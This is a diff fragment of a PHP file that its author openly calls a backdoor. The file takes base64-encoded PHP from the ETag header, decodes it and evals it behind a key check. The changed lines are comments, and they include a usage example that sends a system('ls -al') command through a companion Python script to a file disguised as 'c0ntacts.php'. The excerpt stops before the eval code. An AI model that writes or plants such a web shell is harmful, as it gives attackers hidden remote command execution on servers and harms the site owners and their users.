@@ -1,9 +1,9 @@
 <?php
 // Author:xubzero
 // Description : This is a simple php backdoor that accepts a base64 encoded php line using the etag header,decodes it and evals it. :)
-// 				 The key must be correct 
-// 				 Use the usebackdoor.py file to send raw php lines to the backdoor using the synax below
-//					Usage : http://localhost/tests/c0ntacts.php "system(\'ls -al\')"
+// 		The key must be correct 
+// 		Use the usebackdoor.py file to send raw php lines to the backdoor using the synax below
+//			Usage : python3 usebackdoor.py http://localhost/tests/c0ntacts.php "system(\'ls -al\')"
 
 
 if (isset($_POST['key'])){
